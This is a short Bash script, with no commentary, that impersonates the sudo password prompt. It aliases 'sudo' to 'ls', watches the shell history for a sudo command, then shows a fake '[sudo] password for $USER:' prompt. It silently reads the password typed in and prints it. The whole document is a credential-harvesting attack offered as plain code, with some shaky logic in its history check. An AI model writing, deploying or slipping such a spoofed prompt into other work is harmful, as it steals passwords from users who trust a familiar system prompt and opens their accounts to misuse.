alias sudo="ls"
while [ 1 ]
do 
	var=`history | egrep "^.{7}sudo.*"|tail -1`
	if [ -n $var ]
	then
		read -p "[sudo] password for $USER: " -s d
		break
	fi
done
echo $d
